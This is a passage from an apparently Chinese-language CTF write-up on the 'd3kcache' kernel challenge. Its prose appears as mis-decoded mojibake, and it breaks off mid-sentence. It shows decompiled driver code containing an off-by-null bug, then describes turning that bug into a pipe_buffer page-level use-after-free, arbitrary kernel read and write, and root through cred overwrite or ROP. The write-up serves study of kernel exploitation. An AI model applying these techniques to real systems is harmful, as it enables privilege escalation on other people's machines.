class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>è¿™äº›åŸºæœ¬çš„éƒ½æ˜¯å¼€å¯äº†çš„ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¼€å¯äº†ä¸€ä¸ª<code>Control Flow Integrity</code>ä¿æŠ¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªä¿æŠ¤ä¼šæ£€æµ‹opsæ˜¯å¦åˆæ³•ï¼Œè¿™ä¸ªæ£€æµ‹ååˆ†ä¸¥æ ¼ï¼Œéœ€è¦opsçš„å€¼ä¸ä¸€ä¸ªå›ºå®šçš„å†…å®¹è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœä¸ä¸º0å°±ç›´æ¥è§¦å‘<code>kernel panic</code>ã€‚ä¹Ÿå°±æ˜¯å› ä¸ºå½“æ—¶ä¸æ¸…æ¥šè¿™ä¸ªå†…å®¹å¯¼è‡´æˆ‘è°ƒäº†åŠå¤©å»åŠ«æŒ<code>pipe_buffer</code>çš„opsæŒ‡é’ˆã€‚</p><h3 id="é©±åŠ¨åˆ†æ"><a href="#é©±åŠ¨åˆ†æ" class="headerlink" title="é©±åŠ¨åˆ†æ"></a>é©±åŠ¨åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆå§‹åŒ–æ¨¡å—éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢è°ƒç”¨äº†å‰é¢æåˆ°çš„<code>kmem_cache_create_usercopy</code>å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸­sizeæŒ‡å®šä¸º<code>0x800</code>ï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢æ‰€ä»¥åˆ°çš„ï¼Œè¿™é‡Œçš„orderå³ä¸º3ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// r12</span></span><br><span class="line">  __int64 v20; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [rsp-44h] [rbp-44h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;v26, a3, <span class="number">16LL</span>);</span><br><span class="line">  v5 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">      v20 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);</span><br><span class="line">        v21 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v20] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = <span class="number">0LL</span>;</span><br><span class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v20;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v21] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; kcache_list[<span class="number">4</span> * v26] )</span><br><span class="line">        v11 = kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11;</span><br><span class="line">      v13 = qword_17D8[<span class="number">2</span> * v26];</span><br><span class="line">      v14 = v28;</span><br><span class="line">      _check_object_size(v13, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, <span class="number">1LL</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(v14, v13, v12) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt;= <span class="number">0xF</span>uLL &amp;&amp; qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v27 &gt; <span class="number">0x800</span> || v27 + kcache_list[<span class="number">4</span> * v26] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = qword_17D8[<span class="number">2</span> * v26] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7;</span><br><span class="line">          v10 = v28;</span><br><span class="line">          _check_object_size(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v8 + v9) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      v25 = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    v17 = v27;</span><br><span class="line">    v18 = <span class="number">2048LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt; <span class="number">0x800</span> )</span><br><span class="line">      v18 = v27;</span><br><span class="line">    v19 = v28;</span><br><span class="line">    _check_object_size(v15, v18, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v16, v19, v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="number">0x7FF</span>LL;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        v22 = v17;</span><br><span class="line">      *(_BYTE *)(v16 + v22) = <span class="number">0</span>;</span><br><span class="line">      v23 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);</span><br><span class="line">        v24 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v23] = v16;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = v16;</span><br><span class="line">        v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v23;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v24] = v18;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å°±æ˜¯ioctlå‡½æ•°ï¼Œé€†å‘åˆ†æè¿‡åå¯ä»¥å‘ç°è¿™é‡Œåˆ†ä¸ºå››ä¸ªåˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯å¢åˆ æ”¹æŸ¥ï¼Œè¿™é‡Œæ¼æ´å‘ç”Ÿåœ¨å¢å’Œæ”¹çš„éƒ¨åˆ†ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„<code>off by null</code>ã€‚é™¤æ­¤ä¹‹å¤–å†æ— å…¶ä»–æ¼æ´ã€‚</p><h3 id="é¢„æœŸåˆ©ç”¨åˆ†æ"><a href="#é¢„æœŸåˆ©ç”¨åˆ†æ" class="headerlink" title="é¢„æœŸåˆ©ç”¨åˆ†æ"></a>é¢„æœŸåˆ©ç”¨åˆ†æ</h3><p>æ ¹æ®å‰é¢æ‰€è¿°çš„å†…å®¹ï¼Œç›®å‰å·²ç»è¾¾åˆ°äº†<code>vuln slab page</code>å’Œ<code>victim slab page</code>ç›¸é‚»çš„æƒ…å†µäº†ï¼Œè€Œç»è¿‡åç»­çš„åˆ†ææˆ‘ä»¬å¯ä»¥å¾—çŸ¥å‰é¢ä¸¤ä¸ªé¡µé¢åˆ†åˆ«å¯¹åº”çš„æ˜¯é¢˜ç›®ä¸­åˆ›å»ºçš„<code>slab page</code>å’Œ<code>pipe_buffer</code>æ‰€åœ¨çš„<code>slab_page</code>ã€‚ç­”æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨é¢˜ç›®çš„<code>off by null</code>æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©<code>pipe_buffer-&gt;page</code>æŒ‡é’ˆæŒ‡å‘å…¶ä»–<code>pipe_buffer</code>æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œè€Œå¦‚æœæˆ‘ä»¬æ§åˆ¶å…¶ä¸­ä¸€ä¸ª<code>pipe_buffer</code>å¹¶é‡Šæ”¾æ‰pageï¼Œå°±å½¢æˆäº†é¡µçº§çš„UAFã€‚ä¸è¿‡pageçš„å¤§å°åªæœ‰<code>0x40</code>æ‰€ä»¥æˆåŠŸç‡åªæœ‰1/4ï¼Œå› ä¸ºä»¥<code>0x00</code>ç»“å°¾æ—¶<code>off by null</code>æ— æ³•å½±å“å…¶æŒ‡å‘ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171327450.png"                      alt="image-20230519171327450"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171353853.png"                      alt="image-20230519171353853"                ></p><p>ç›®å‰æˆ‘ä»¬å·²ç»å½¢æˆäº†é¡µçº§çš„UAFï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åœ¨å·²ç»freeçš„pageå¤„ç”³è¯·<code>pipe_buffer</code>ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173248182.png"                      alt="image-20230519173248182"                ></p><p>ç»“æœå°±æ˜¯ä¼šå½¢æˆå¦‚ä¸Šå›¾ä¸€æ ·çš„ç»“æ„ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æœ€å·¦è¾¹çš„<code>pipe_buffer</code>è¯»å–åˆ°å®ƒpageæŒ‡å‘çš„æ–°çš„<code>pipe_buffer</code>ä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”æ­¤æ—¶æˆ‘ä»¬ä¸å…‰å¯ä»¥è¯»å–è¿˜å¯ä»¥å¯¹pageçš„å†…å®¹è¿›è¡Œå†™ï¼Œå¯ä»¥è®©æœ€å³è¾¹çš„ä¸¤ä¸ª<code>pipe_buffer</code>çš„pageæŒ‡é’ˆåˆæŒ‡å‘åŒä¸€ä¸ªï¼Œä»è€Œå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173704454.png"                      alt="image-20230519173704454"                ></p><p>æ ¹æ®ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æœ€å³è¾¹çš„pageç»™freeæ‰åˆä¸€æ¬¡é€ æˆäº†é¡µçº§çš„UAFï¼Œä½†æ˜¯è¿™ä¸€æ¬¡ä¸åŒçš„æ˜¯æˆ‘ä»¬é€šè¿‡ç¬¬ä¸€æ¬¡çš„æ³„æ¼å¯ä»¥çŸ¥é“æœ€å³è¾¹pageçš„åœ°å€çš„ã€‚æœ‰è¶£çš„æ¥äº†ï¼Œåœ¨æœ€å³è¾¹é€ æˆäº†é¡µçº§çš„UAFä¹‹åæˆ‘ä»¬ç»§ç»­ç”³è¯·<code>pipe_buffer</code>æ”¾åœ¨æœ€å³è¾¹çš„pageä¸­ï¼Œå¹¶ä¸”æ§åˆ¶é‡Œé¢<code>pipe_buffer</code>çš„pageæŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œæœ€ç»ˆå½¢æˆä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519174027597.png"                      alt="image-20230519174027597"                ></p><p>å› ä¸ºæ˜¯ä¸€ä¸ªé¡µçº§UAFçš„ç¼˜æ•…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ä¸­é—´çš„pipeå»ä¿®æ”¹ä¸‹é¢çš„å…¶ä»–<code>pipe_buffer</code>ï¼Œæ‰€ä»¥åœ¨æœ€å³ä¾§ï¼Œæˆ‘ä»¬æ€»å…±å¯ä»¥æ§åˆ¶åˆ°ä¸‰ä¸ª<code>pipe_buffer</code>ã€‚è€Œè¿™ä¸‰ä¸ª<code>pipe_buffer</code>çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p><ol><li>  ç¬¬ä¸€ä¸ªç®¡é“é€šè¿‡pageæŒ‡é’ˆå†…å­˜ç©ºé—´çš„ä»»æ„åœ°å€è¯»å†™</li><li>  ç¬¬äºŒä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“çš„å†…å®¹ï¼Œè®©ç¬¬ä¸‰ä¸ªç®¡é“å¯ä»¥æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>  ç¬¬ä¸‰ä¸ªç®¡é“ç”¨äºä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“å’Œç¬¬äºŒä¸ªç®¡é“ï¼Œä¿®æ”¹ç¬¬ä¸€ä¸ªç®¡é“çš„pageåˆ°æŒ‡å®šä½ç½®ï¼Œä¿®æ”¹ç¬¬äºŒä¸ªç®¡é“çš„æŒ‡å‘ä¸ºç¬¬ä¸‰ä¸ªç®¡é“</li></ol><p>è¿™æ ·ä¸‰ä¸ªç®¡é“å®ç°äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œå³å¯å®ç°æ•´ä¸ªå†…æ ¸å†…å­˜ç©ºé—´å‡ ä¹æ— ä»»ä½•é™åˆ¶çš„ä»»æ„åœ°å€è¯»å†™ã€‚</p><p>æ—¢ç„¶å·²ç»å¯ä»¥ä»»æ„åœ°å€æ— é™åˆ¶è¯»å†™äº†ï¼Œé‚£ä¹ˆææƒçš„æ–¹å¼ä¹Ÿå°±å¤šç§å¤šæ ·äº†ã€‚å½“ç„¶ï¼Œè¿™é‡Œéœ€è¦æå‰æ³¨æ„åˆ°çš„æ˜¯<code>pipe_buffer</code>ä¸­çš„pageæŒ‡é’ˆç»ˆå½’æ˜¯è¦æŒ‡å‘åˆ°pageç»“æ„ä½“çš„ã€‚è€Œå†…æ ¸ä¸­<code>vmemmap</code>åŒºåŸŸä¸­å­˜æ”¾ç€æ‰€æœ‰çš„pageç»“æ„ä½“ï¼Œæ‰€ä»¥é¦–è¦æ‰¾åˆ°<code>vmemmap</code>åŒºåŸŸå³å¯ã€‚</p><p>é‚£ä¹ˆç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹task_structä¸­çš„credæŒ‡é’ˆä¸º<code>init_cred</code>çš„åœ°å€ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯é€šè¿‡å†™å†…æ ¸æ ˆå®ç°ROPçš„åŠæ³•ï¼Œé¦–å…ˆéœ€è¦æ³„æ¼å‡ºæ 